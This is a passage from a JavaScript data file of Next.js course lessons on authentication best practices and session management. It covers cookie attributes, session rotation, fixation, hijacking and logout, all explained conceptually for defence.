            content: "Always validate on the server."
          },
          {
            type: "paragraph",
            content: "5. Detailed Error Messages"
          },
          {
            type: "paragraph",
            content: "Bad:"
          },
          {
            type: "output",
            content: [
              "Email not found"
            ]
          },
          {
            type: "paragraph",
            content: "or"
          },
          {
            type: "output",
            content: [
              "Wrong password"
            ]
          },
          {
            type: "paragraph",
            content: "Good:"
          },
          {
            type: "output",
            content: [
              "Invalid email or password."
            ]
          },
          {
            type: "paragraph",
            content: "6. Unlimited Login Attempts"
          },
          {
            type: "paragraph",
            content: "Without rate limiting:"
          },
          {
            type: "flow",
            steps: [
              "Millions of Passwords", "→",
              "Login API"
            ]
          },
          {
            type: "paragraph",
            content: "This becomes a brute-force attack."
          },
          {
            type: "paragraph",
            content: "7. Weak Password Requirements"
          },
          {
            type: "paragraph",
            content: "Avoid passwords like:"
          },
          {
            type: "output",
            content: [
              "123456",
              "",
              "password",
              "",
              "abc123"
            ]
          },
          {
            type: "paragraph",
            content: "Require stronger credentials and encourage password managers."
          },
          {
            type: "paragraph",
            content: "8. Missing MFA"
          },
          {
            type: "paragraph",
            content: "Passwords alone are often insufficient."
          },
          {
            type: "paragraph",
            content: "Sensitive applications should offer MFA."
          },
          {
            type: "paragraph",
            content: "9. Exposing Sensitive Data"
          },
          {
            type: "paragraph",
            content: "Never return:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "password hashes",
              "refresh tokens",
              "secret keys",
              "database errors",
              "stack traces"
            ]
          },
          {
            type: "paragraph",
            content: "to the client."
          },
          {
            type: "paragraph",
            content: "10. Hardcoding Secrets"
          },
          {
            type: "paragraph",
            content: "Bad:"
          },
          {
            type: "code",
            language: "javascript",
            content: `const SECRET = "mysecret123";`
          },
          {
            type: "paragraph",
            content: "Instead:"
          },
          {
            type: "code",
            language: "text",
            content: `JWT_SECRET=...
DATABASE_URL=...`
          },
          {
            type: "paragraph",
            content: "Use environment variables."
          },
          {
            type: "paragraph",
            content: "11. Long-lived Sessions"
          },
          {
            type: "paragraph",
            content: "Sessions should expire."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Login", "→",
              "Session", "→",
              "30 Minutes Idle", "→",
              "Expire"
            ]
          },
          {
            type: "paragraph",
            content: "12. Forgetting Logout"
          },
          {
            type: "paragraph",
            content: "Logout should invalidate the session."
          },
          {
            type: "paragraph",
            content: "Deleting only the frontend state is not enough."
          },
          {
            type: "paragraph",
            content: "13. Missing Authorization Checks"
          },
          {
            type: "paragraph",
            content: "Authenticated users should not automatically access admin features."
          },
          {
            type: "paragraph",
            content: "Always verify permissions."
          },
          {
            type: "paragraph",
            content: "14. Ignoring CSRF Protection"
          },
          {
            type: "paragraph",
            content: "Forms performing sensitive actions should protect against CSRF where applicable."
          },
          {
            type: "paragraph",
            content: "15. No Audit Logging"
          },
          {
            type: "paragraph",
            content: "Production applications should record:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "successful logins",
              "failed logins",
              "password changes",
              "account lockouts",
              "MFA events"
            ]
          },
          {
            type: "paragraph",
            content: "These logs help detect attacks and investigate incidents."
          }
        ]
      },
      {
        heading: "Authentication Best Practices",
        blocks: [
          {
            type: "paragraph",
            content: "Now let's look at professional recommendations followed by large organizations."
          },
          {
            type: "paragraph",
            content: "Use HTTPS Everywhere"
          },
          {
            type: "paragraph",
            content: "Never allow login over HTTP."
          },
          {
            type: "paragraph",
            content: "Use Modern Password Hashing"
          },
          {
            type: "paragraph",
            content: "Recommended:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Argon2id",
              "bcrypt"
            ]
          },
          {
            type: "paragraph",
            content: "Avoid custom hashing algorithms."
          },
          {
            type: "paragraph",
            content: "Enable MFA"
          },
          {
            type: "paragraph",
            content: "Especially for:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "administrators",
              "financial applications",
              "healthcare systems",
              "enterprise software"
            ]
          },
          {
            type: "paragraph",
            content: "Keep Sessions Short"
          },
          {
            type: "paragraph",
            content: "Idle sessions should expire automatically."
          },
          {
            type: "paragraph",
            content: "Rotate Secrets"
          },
          {
            type: "paragraph",
            content: "Regularly rotate:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "JWT secrets",
              "API keys",
              "encryption keys"
            ]
          },
          {
            type: "paragraph",
            content: "Store Secrets Securely"
          },
          {
            type: "paragraph",
            content: "Never commit:"
          },
          {
            type: "output",
            content: [
              ".env"
            ]
          },
          {
            type: "paragraph",
            content: "to Git."
          },
          {
            type: "paragraph",
            content: "Use secure secret managers in production."
          },
          {
            type: "paragraph",
            content: "Use Secure Cookies"
          },
          {
            type: "paragraph",
            content: "Authentication cookies should typically include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "HttpOnly",
              "Secure",
              "SameSite"
            ]
          },
          {
            type: "paragraph",
            content: "This reduces common web attacks."
          },
          {
            type: "paragraph",
            content: "Implement Rate Limiting"
          },
          {
            type: "paragraph",
            content: "Protect:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "login",
              "registration",
              "password reset",
              "OTP verification"
            ]
          },
          {
            type: "paragraph",
            content: "Log Authentication Events"
          },
          {
            type: "paragraph",
            content: "Track:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "successful login",
              "failed login",
              "logout",
              "password reset",
              "MFA failures",
              "suspicious activity"
            ]
          },
          {
            type: "paragraph",
            content: "Separate Authentication and Authorization"
          },
          {
            type: "paragraph",
            content: "Keep identity verification separate from permission checks."
          },
          {
            type: "paragraph",
            content: "This makes systems easier to maintain and audit."
          },
          {
            type: "paragraph",
            content: "Validate Everything"
          },
          {
            type: "paragraph",
            content: "Never trust:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "forms",
              "cookies",
              "headers",
              "query parameters",
              "request bodies"
            ]
          },
          {
            type: "paragraph",
            content: "Always validate server-side."
          },
          {
            type: "paragraph",
            content: "Protect Against Enumeration"
          },
          {
            type: "paragraph",
            content: "Always use generic authentication error messages."
          },
          {
            type: "paragraph",
            content: "Monitor Suspicious Activity"
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "repeated failed logins",
              "impossible travel (login from distant locations in a short time)",
              "multiple devices",
              "unusual IP addresses"
            ]
          },
          {
            type: "paragraph",
            content: "Use Trusted Authentication Libraries"
          },
          {
            type: "paragraph",
            content: "Instead of writing everything from scratch, use mature solutions such as:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "NextAuth/Auth.js",
              "Clerk",
              "Auth0",
              "Firebase Authentication",
              "Supabase Auth"
            ]
          },
          {
            type: "paragraph",
            content: "These libraries implement many security best practices by default."
          }
        ]
      },
      {
        heading: "Complete Authentication Architecture",
        blocks: [
          {
            type: "code",
            language: "text",
            content: `                User
                  │
                  ▼
         HTTPS Login Request
                  │
                  ▼
          Input Validation
                  │
                  ▼
           Rate Limiting
                  │
                  ▼
       Password Verification
                  │
                  ▼
         MFA Verification
                  │
                  ▼
      Session / JWT Creation
                  │
                  ▼
     Secure HttpOnly Cookie
                  │
                  ▼
      Authorization Check
                  │
                  ▼
        Protected Resources`
          },
          {
            type: "paragraph",
            content: "This layered architecture significantly improves security and maintainability."
          }
        ]
      },
      {
        heading: "Real-World Example",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine an online banking application."
          },
          {
            type: "paragraph",
            content: "When a customer logs in:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "The login page is served over HTTPS.",
              "Client-side validation catches obvious input errors.",
              "The server validates all submitted data.",
              "Rate limiting checks for excessive login attempts.",
              "The password is verified against a bcrypt or Argon2 hash.",
              "If MFA is enabled, a one-time code is requested.",
              "After successful verification, the server creates a secure session and sends an HttpOnly, Secure, and SameSite cookie.",
              "All future authenticated requests use that session cookie until logout or expiration."
            ]
          },
          {
            type: "paragraph",
            content: "Every subsequent request checks both authentication and authorization."
          },
          {
            type: "paragraph",
            content: "All authentication events are logged for monitoring."
          },
          {
            type: "paragraph",
            content: "Sessions automatically expire after inactivity."
          },
          {
            type: "paragraph",
            content: "This combination of layers—not any single feature—is what makes modern authentication secure."
          }
        ]
      },
      {
        heading: "DevSphere Special Note 💡",
        blocks: [
          {
            type: "note",
            content: "Many beginners think authentication ends when the user clicks the Login button. In reality, login is just one small part of a much larger authentication system. Professional applications focus on the entire lifecycle: Secure registration, Password hashing, HTTPS, MFA, Session management, Authorization, Password reset, Logout, Monitoring, Logging, Rate limiting, Secret management. When designing authentication, think in terms of defense in depth: assume that one layer may fail, and ensure that other layers still protect the application."
          }
        ]
      },
      {
        heading: "Summary",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication is not a single feature but a complete security architecture."
          },
          {
            type: "paragraph",
            content: "In this response, you learned:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "How production authentication systems are structured.",
              "The layered architecture behind secure login flows.",
              "How registration, login, logout, password reset, OAuth, and microservice authentication fit together.",
              "The most common authentication mistakes and how to avoid them.",
              "Industry best practices such as HTTPS, secure cookies, password hashing, MFA, rate limiting, audit logging, and secret management.",
              "How these practices combine to build a scalable, secure, and production-ready authentication system suitable for modern Next.js applications."
            ]
          },
          {
            type: "paragraph",
            content: "You now have a strong conceptual foundation for authentication. In the upcoming lessons on Session Management, NextAuth, JWT Authentication, Protected Routes, Authorization, and Role-Based Access Control (RBAC), you'll build upon these principles and implement them in real-world Next.js applications."
          }
        ]
      }
    ]
  },




  /* ===========================
    Second Topic : Session Management
============================= */
    "nextjs-session-management": {
    title: "Session Management",
    readingTime: "30 min",
        
    content: [
      {
        heading: "Goal",
        blocks: [
          {
            type: "paragraph",
            content: "Learn how authenticated users stay logged in after logging in, how sessions work internally, and how production applications securely manage millions of active users."
          }
        ]
      },
      {
        heading: "Introduction",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication answers one question:"
          },
          {
            type: "output",
            content: [
              "\"Who are you?\""
            ]
          },
          {
            type: "paragraph",
            content: "But after the server verifies your identity, another problem immediately appears:"
          },
          {
            type: "output",
            content: [
              "\"How does the server remember you on the next request?\""
            ]
          },
          {
            type: "paragraph",
            content: "HTTP is stateless."
          },
          {
            type: "paragraph",
            content: "That means every request is completely independent."
          },
          {
            type: "paragraph",
            content: "If sessions didn't exist, users would need to enter their username and password for every page they visit."
          },
          {
            type: "paragraph",
            content: "Imagine this:"
          },
          {
            type: "flow",
            steps: [
              "Login", "→",
              "Open Dashboard", "→",
              "Enter Password Again", "→",
              "Open Profile", "→",
              "Enter Password Again", "→",
              "Open Settings", "→",
              "Enter Password Again"
            ]
          },
          {
            type: "paragraph",
            content: "Clearly impossible."
          },
          {
            type: "paragraph",
            content: "This is why Session Management exists."
          },
          {
            type: "paragraph",
            content: "Session management is one of the most important concepts in authentication, and every major platform—including Google, GitHub, Amazon, Microsoft, Netflix, Discord, Facebook, X (Twitter), and banking applications—uses some form of session management."
          }
        ]
      },
      {
        heading: "What is a Session?",
        blocks: [
          {
            type: "paragraph",
            content: "A session is a temporary authenticated relationship between a user and the server."
          },
          {
            type: "paragraph",
            content: "Instead of asking:"
          },
          {
            type: "output",
            content: [
              "\"Who are you?\" every request,"
            ]
          },
          {
            type: "paragraph",
            content: "the server says:"
          },
          {
            type: "output",
            content: [
              "\"I already know you because you have a valid session.\""
            ]
          },
          {
            type: "paragraph",
            content: "Think of it like a hotel."
          }
        ]
      },
      {
        heading: "Without Session",
        blocks: [
          {
            type: "paragraph",
            content: "Every time you walk into the hotel:"
          },
          {
            type: "output",
            content: [
              "Reception:",
              "Who are you?",
              "",
              "You:",
              "Room 302",
              "",
              "Reception:",
              "Show your ID."
            ]
          },
          {
            type: "paragraph",
            content: "Again..."
          },
          {
            type: "output",
            content: [
              "Reception:",
              "Who are you?",
              "",
              "You:",
              "Room 302",
              "",
              "Reception:",
              "Show your ID again."
            ]
          },
          {
            type: "paragraph",
            content: "Very annoying."
          }
        ]
      },
      {
        heading: "With Session",
        blocks: [
          {
            type: "paragraph",
            content: "Instead, the hotel gives you a room card."
          },
          {
            type: "flow",
            steps: [
              "Check In", "→",
              "Receive Card", "→",
              "Use Card Anywhere"
            ]
          },
          {
            type: "paragraph",
            content: "The card proves your identity."
          },
          {
            type: "paragraph",
            content: "A web session works exactly the same way."
          },
          {
            type: "paragraph",
            content: "Instead of carrying your password, you carry a session identifier."
          }
        ]
      },
      {
        heading: "Why Sessions Exist",
        blocks: [
          {
            type: "paragraph",
            content: "Sessions solve several important problems."
          },
          {
            type: "paragraph",
            content: "Without sessions:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Users must log in repeatedly.",
              "Every request requires password verification.",
              "Password hashes must be checked constantly.",
              "Applications become slower.",
              "User experience becomes terrible."
            ]
          },
          {
            type: "paragraph",
            content: "Sessions provide:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Faster requests",
              "Better security",
              "Better user experience",
              "Reduced database work",
              "Persistent login state"
            ]
          }
        ]
      },
      {
        heading: "Authentication vs Session",
        blocks: [
          {
            type: "paragraph",
            content: "Many beginners confuse these."
          },
          {
            type: "paragraph",
            content: "Authentication:"
          },
          {
            type: "output",
            content: [
              "Prove Identity"
            ]
          },
          {
            type: "paragraph",
            content: "Session:"
          },
          {
            type: "output",
            content: [
              "Remember Identity"
            ]
          },
          {
            type: "paragraph",
            content: "Authentication happens once."
          },
          {
            type: "paragraph",
            content: "Session is used for every request afterward."
          }
        ]
      },
      {
        heading: "Login Session Lifecycle",
        blocks: [
          {
            type: "paragraph",
            content: "Let's understand the complete lifecycle."
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Login Form", "→",
              "Server verifies credentials", "→",
              "Session created", "→",
              "Session ID generated", "→",
              "Cookie sent to browser", "→",
              "Future requests include cookie", "→",
              "Server verifies session", "→",
              "User stays logged in", "→",
              "Logout", "→",
              "Session destroyed"
            ]
          },
          {
            type: "paragraph",
            content: "This is the complete lifecycle of almost every authentication system."
          }
        ]
      },
      {
        heading: "Session Creation",
        blocks: [
          {
            type: "paragraph",
            content: "Suppose a user logs in."
          },
          {
            type: "output",
            content: [
              "Email",
              "",
              "john@example.com",
              "",
              "Password",
              "",
              "********"
            ]
          },
          {
            type: "paragraph",
            content: "Server verifies:"
          },
          {
            type: "flow",
            steps: [
              "Password Hash", "→",
              "Match", "→",
              "Authentication Successful"
            ]
          },
          {
            type: "paragraph",
            content: "Now the server creates a session."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "Session ID",
              "",
              "9ab73ef91c72..."
            ]
          },
          {
            type: "paragraph",
            content: "The session may contain:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Session ID",
              "User ID",
              "Creation Time",
              "Expiration Time",
              "Last Activity",
              "IP Address (optional)",
              "Device Information (optional)"
            ]
          },
          {
            type: "paragraph",
            content: "The password is never stored inside the session."
          }
        ]
      },
      {
        heading: "Session ID",
        blocks: [
          {
            type: "paragraph",
            content: "The Session ID is the most important part of session management."
          },
          {
            type: "paragraph",
            content: "It is a unique random identifier."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "9ab73ef91c72db84e2ff2..."
            ]
          },
          {
            type: "paragraph",
            content: "The browser stores only this identifier."
          },
          {
            type: "paragraph",
            content: "Not:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "password",
              "email",
              "role",
              "personal data"
            ]
          },
          {
            type: "paragraph",
            content: "Only the session ID."
          }
        ]
      },
      {
        heading: "Why Random Session IDs?",
        blocks: [
          {
            type: "paragraph",
            content: "Predictable IDs are dangerous."
          },
          {
            type: "paragraph",
            content: "Bad:"
          },
          {
            type: "output",
            content: [
              "Session 1",
              "",
              "Session 2",
              "",
              "Session 3"
            ]
          },
          {
            type: "paragraph",
            content: "Attackers could guess them."
          },
          {
            type: "paragraph",
            content: "Good:"
          },
          {
            type: "output",
            content: [
              "4c91b2df82b7ad90...",
              "",
              "af92de74bd001ca8...",
              "",
              "f18de832ab7c991d..."
            ]
          },
          {
            type: "paragraph",
            content: "Cryptographically random IDs prevent guessing attacks."
          }
        ]
      },
      {
        heading: "Session Cookies",
        blocks: [
          {
            type: "paragraph",
            content: "How does the browser remember the session?"
          },
          {
            type: "paragraph",
            content: "The server sends a cookie."
          },
          {
            type: "paragraph",
            content: "Example response:"
          },
          {
            type: "output",
            content: [
              "Set-Cookie:",
              "",
              "session=4c91b2df82b7ad90..."
            ]
          },
          {
            type: "paragraph",
            content: "Browser stores it."
          },
          {
            type: "paragraph",
            content: "Every future request automatically includes:"
          },
          {
            type: "output",
            content: [
              "Cookie:",
              "",
              "session=4c91b2df82b7ad90..."
            ]
          },
          {
            type: "paragraph",
            content: "The user never notices this happening."
          }
        ]
      },
      {
        heading: "How Cookies Travel",
        blocks: [
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Request\n\nCookie:\nsession=abc123", "→",
              "Server", "→",
              "Find Session", "→",
              "User Authenticated"
            ]
          },
          {
            type: "paragraph",
            content: "Cookies are automatically sent by browsers for matching domains and paths."
          }
        ]
      },
      {
        heading: "Session Storage",
        blocks: [
          {
            type: "paragraph",
            content: "Where are sessions stored?"
          },
          {
            type: "paragraph",
            content: "There are multiple options."
          }
        ]
      },
      {
        heading: "1. Memory Sessions",
        blocks: [
          {
            type: "flow",
            steps: [
              "Server RAM", "→",
              "Sessions"
            ]
          },
          {
            type: "paragraph",
            content: "Advantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Very fast",
              "Simple"
            ]
          },
          {
            type: "paragraph",
            content: "Disadvantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Lost after restart",
              "Doesn't scale",
              "Multiple servers cannot share them"
            ]
          },
          {
            type: "paragraph",
            content: "Suitable only for development or small apps."
          }
        ]
      },
      {
        heading: "2. Database Sessions",
        blocks: [
          {
            type: "flow",
            steps: [
              "Application", "→",
              "Database", "→",
              "Sessions Table"
            ]
          },
          {
            type: "paragraph",
            content: "Typical table:"
          },
          {
            type: "table",
            headers: [
              "Session ID",
              "User ID",
              "Expires"
            ],
            rows: [
              [
                "abc123",
                "14",
                "Tomorrow"
              ],
              [
                "xyz991",
                "22",
                "Tonight"
              ]
            ]
          },
          {
            type: "paragraph",
            content: "Advantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Persistent",
              "Reliable",
              "Easy to query and revoke"
            ]
          },
          {
            type: "paragraph",
            content: "Disadvantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Slower than memory",
              "Every request may require a database lookup"
            ]
          }
        ]
      },
      {
        heading: "3. Redis Sessions",
        blocks: [
          {
            type: "paragraph",
            content: "Redis is one of the most popular session stores."
          },
          {
            type: "flow",
            steps: [
              "Application", "→",
              "Redis", "→",
              "Sessions"
            ]
          },
          {
            type: "paragraph",
            content: "Advantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Extremely fast",
              "Shared across servers",
              "Automatic expiration",
              "Ideal for large-scale systems"
            ]
          },
          {
            type: "paragraph",
            content: "Large production systems frequently choose Redis for session storage."
          }
        ]
      },
      {
        heading: "Server-side Sessions",
        blocks: [
          {
            type: "paragraph",
            content: "This is the traditional approach."
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Session ID", "→",
              "Server", "→",
              "Session Database", "→",
              "User Data"
            ]
          },
          {
            type: "paragraph",
            content: "Browser only knows the session ID."
          },
          {
            type: "paragraph",
            content: "Everything else stays on the server."
          },
          {
            type: "paragraph",
            content: "Advantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Easy invalidation",
              "Centralized control",
              "Better revocation",
              "Small cookies"
            ]
          },
          {
            type: "paragraph",
            content: "Disadvantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Requires session storage",
              "Every authenticated request performs a lookup"
            ]
          }
        ]
      },
      {
        heading: "Stateless Sessions",
        blocks: [
          {
            type: "paragraph",
            content: "Modern applications often use stateless sessions based on signed tokens (such as JWTs)."
          },
          {
            type: "flow",
            steps: [
              "Server", "→",
              "Generate Signed Token", "→",
              "Browser Stores Token", "→",
              "Future Requests", "→",
              "Server Verifies Signature"
            ]
          },
          {
            type: "paragraph",
            content: "Advantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "No central session database required",
              "Easy horizontal scaling",
              "Useful for distributed systems"
            ]
          },
          {
            type: "paragraph",
            content: "Disadvantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Harder to revoke immediately",
              "Larger tokens",
              "Requires careful expiration and refresh strategies"
            ]
          },
          {
            type: "paragraph",
            content: "You'll study JWTs in depth in the dedicated JWT Authentication lesson."
          }
        ]
      },
      {
        heading: "Cookie Attributes",
        blocks: [
          {
            type: "paragraph",
            content: "Cookies contain more than just a value."
          },
          {
            type: "paragraph",
            content: "Proper attributes significantly improve security."
          }
        ]
      },
      {
        heading: "HttpOnly",
        blocks: [
          {
            type: "paragraph",
            content: "HttpOnly"
          },
          {
            type: "paragraph",
            content: "JavaScript cannot access the cookie."
          },
          {
            type: "paragraph",
            content: "Without it:"
          },
          {
            type: "output",
            content: [
              "document.cookie"
            ]
          },
          {
            type: "paragraph",
            content: "could expose authentication cookies during an XSS attack."
          },
          {
            type: "paragraph",
            content: "Always use HttpOnly for authentication cookies."
          }
        ]
      },
      {
        heading: "Secure",
        blocks: [
          {
            type: "paragraph",
            content: "Secure"
          },
          {
            type: "paragraph",
            content: "Cookie is sent only over HTTPS."
          },
          {
            type: "paragraph",
            content: "Without Secure:"
          },
          {
            type: "flow",
            steps: [
              "HTTP", "→",
              "Cookie Sent"
            ]
          },
          {
            type: "paragraph",
            content: "An attacker on the network could intercept it."
          }
        ]
      },
      {
        heading: "SameSite",
        blocks: [
          {
            type: "paragraph",
            content: "Controls when cookies are sent across sites."
          },
          {
            type: "paragraph",
            content: "Values:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Strict",
              "Lax",
              "None"
            ]
          },
          {
            type: "paragraph",
            content: "Strict"
          },
          {
            type: "paragraph",
            content: "Only same-site requests receive the cookie."
          },
          {
            type: "paragraph",
            content: "Highest CSRF protection."
          },
          {
            type: "paragraph",
            content: "Lax"
          },
          {
            type: "paragraph",
            content: "Sent for most same-site requests and top-level navigations."
          },
          {
            type: "paragraph",
            content: "Common default for many applications."
          },
          {
            type: "paragraph",
            content: "None"
          },
          {
            type: "paragraph",
            content: "Cookie is sent in cross-site requests."
          },
          {
            type: "paragraph",
            content: "Must also use:"
          },
          {
            type: "output",
            content: [
              "Secure"
            ]
          },
          {
            type: "paragraph",
            content: "Required for some embedded or third-party authentication scenarios."
          }
        ]
      },
      {
        heading: "Cookie Expiration",
        blocks: [
          {
            type: "paragraph",
            content: "Cookies may be:"
          },
          {
            type: "paragraph",
            content: "Session Cookies"
          },
          {
            type: "paragraph",
            content: "Deleted when browser closes."
          },
          {
            type: "flow",
            steps: [
              "Browser Closed", "→",
              "Cookie Deleted"
            ]
          },
          {
            type: "paragraph",
            content: "Persistent Cookies"
          },
          {
            type: "paragraph",
            content: "Remain until expiration."
          },
          {
            type: "flow",
            steps: [
              "Today", "→",
              "Tomorrow", "→",
              "Next Week", "→",
              "Expires"
            ]
          },
          {
            type: "paragraph",
            content: "Useful for \"Remember Me\" functionality."
          }
        ]
      },
      {
        heading: "Refresh Sessions",
        blocks: [
          {
            type: "paragraph",
            content: "Long-lived sessions introduce security risks."
          },
          {
            type: "paragraph",
            content: "Instead, applications often issue short-lived sessions and refresh them periodically."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Access Session\n\n15 Minutes", "→",
              "Refresh Session\n\n7 Days", "→",
              "New Access Session"
            ]
          },
          {
            type: "paragraph",
            content: "Benefits:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Better security",
              "Limits stolen-session usefulness",
              "Keeps users logged in"
            ]
          }
        ]
      },
      {
        heading: "Session Rotation",
        blocks: [
          {
            type: "paragraph",
            content: "A session identifier should not live forever."
          },
          {
            type: "paragraph",
            content: "After important events:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "login",
              "password change",
              "privilege escalation",
              "MFA verification"
            ]
          },
          {
            type: "paragraph",
            content: "generate a new session ID."
          },
          {
            type: "flow",
            steps: [
              "Old Session", "→",
              "New Session", "→",
              "Old Invalidated"
            ]
          },
          {
            type: "paragraph",
            content: "This reduces the impact of stolen session identifiers."
          }
        ]
      },
      {
        heading: "Session Fixation",
        blocks: [
          {
            type: "paragraph",
            content: "Session fixation is a classic attack."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Attacker Creates Session", "→",
              "Victim Logs In", "→",
              "Server Reuses Same Session", "→",
              "Attacker Knows Session ID"
            ]
          },
          {
            type: "paragraph",
            content: "Solution:"
          },
          {
            type: "paragraph",
            content: "Always regenerate the session immediately after successful login."
          },
          {
            type: "flow",
            steps: [
              "Anonymous Session", "→",
              "Login", "→",
              "New Session Generated"
            ]
          },
          {
            type: "paragraph",
            content: "Never reuse pre-login session IDs."
          }
        ]
      },
      {
        heading: "Logout",
        blocks: [
          {
            type: "paragraph",
            content: "Logging out should do more than redirect the user."
          },
          {
            type: "paragraph",
            content: "Proper logout flow:"
          },
          {
            type: "flow",
            steps: [
              "Logout", "→",
              "Delete Cookie", "→",
              "Invalidate Session", "→",
              "Redirect Login"
            ]
          },
          {
            type: "paragraph",
            content: "If only the browser cookie is removed while the server session remains valid, the session may still be abused."
          }
        ]
      },
      {
        heading: "Session Invalidation",
        blocks: [
          {
            type: "paragraph",
            content: "Sometimes the server must terminate sessions before they expire."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Password changed",
              "User account disabled",
              "Security breach detected",
              "User clicks \"Log out from all devices\""
            ]
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Invalidate All Sessions", "→",
              "Every Device Logged Out"
            ]
          }
        ]
      },
      {
        heading: "Session Hijacking",
        blocks: [
          {
            type: "paragraph",
            content: "Session hijacking occurs when an attacker steals a valid session."
          },
          {
            type: "paragraph",
            content: "Possible causes:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "XSS",
              "Network interception on HTTP",
              "Malware",
              "Session fixation",
              "Stolen devices"
            ]
          },
          {
            type: "paragraph",
            content: "If successful:"
          },
          {
            type: "flow",
            steps: [
              "Attacker", "→",
              "Uses Session Cookie", "→",
              "Server Thinks", "→",
              "Legitimate User"
            ]
          },
          {
            type: "paragraph",
            content: "The attacker may never need the user's password."
          }
        ]
      },
      {
        heading: "Protecting Against Session Hijacking",
        blocks: [
          {
            type: "paragraph",
            content: "Professional applications combine several defenses:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "HTTPS",
              "HttpOnly cookies",
              "Secure cookies",
              "SameSite cookies",
              "Short session lifetime",
              "Session rotation",
              "Device verification",
              "MFA",
              "Suspicious activity detection"
            ]
          },
          {
            type: "paragraph",
            content: "No single defense is enough; they work together."
          }
        ]
      },
      {
        heading: "Session Security Checklist",
        blocks: [
          {
            type: "paragraph",
            content: "A production-ready session system should include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Cryptographically random session IDs",
              "HttpOnly cookies",
              "Secure cookies",
              "SameSite protection",
              "HTTPS everywhere",
              "Session expiration",
              "Session rotation",
              "Session invalidation",
              "Rate limiting on login",
              "Audit logging",
              "MFA for sensitive accounts"
            ]
          }
        ]
      },
      {
        heading: "Session Management in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "Next.js supports several session strategies."
          },
          {
            type: "paragraph",
            content: "Typical architecture:"
          },
          {
            type: "tree",
            content: `app/
├── login/
├── dashboard/
├── middleware.ts
└── lib/
    ├── auth.ts
    └── session.ts`
          },
          {
            type: "paragraph",
            content: "A common flow is:"
          },
          {
            type: "list",
            style: "ordered",
            items: [
              "User submits credentials.",
              "Server Action or Route Handler verifies them.",
              "A session is created.",
              "A secure cookie is set.",
              "Middleware checks the session on protected routes.",
              "Server Components read the authenticated user.",
              "Logout invalidates the session and clears the cookie."
            ]
          }
        ]
      },
      {
        heading: "Production Example — E-commerce",
        blocks: [
          {
            type: "flow",
            steps: [
              "Customer", "→",
              "Login", "→",
              "Session Created", "→",
              "Browse Products", "→",
              "Add Cart", "→",
              "Checkout", "→",
              "Payment", "→",
              "Logout"
            ]
          },
          {
            type: "paragraph",
            content: "The customer authenticates only once while the session maintains identity throughout the shopping experience."
          }
        ]
      },
      {
        heading: "Production Example — Banking",
        blocks: [
          {
            type: "flow",
            steps: [
              "Login", "→",
              "Password", "→",
              "MFA", "→",
              "Session", "→",
              "Balance", "→",
              "Transfer Money", "→",
              "Session Timeout", "→",
              "Login Again"
            ]
          },
          {
            type: "paragraph",
            content: "High-risk applications use shorter session lifetimes and stricter re-authentication policies."
          }
        ]
      },
      {
        heading: "Best Practices",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Use HTTPS for every authenticated request.",
              "Store authentication cookies as HttpOnly, Secure, and SameSite where appropriate.",
              "Generate cryptographically secure session IDs.",
              "Rotate sessions after login and sensitive account changes.",
              "Expire idle sessions automatically.",
              "Allow users to log out from all devices.",
              "Store server-side sessions in Redis or a database for production systems.",
              "Audit login, logout, and session-related events.",
              "Use MFA for sensitive operations.",
              "Separate authentication from authorization logic."
            ]
          }
        ]
      },
      {
        heading: "Common Mistakes",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "❌ Storing passwords in cookies.",
              "❌ Storing sensitive user data directly inside cookies.",
              "❌ Using predictable session IDs.",
              "❌ Forgetting HTTPS.",
              "❌ Not rotating session IDs after login.",
              "❌ Never expiring sessions.",
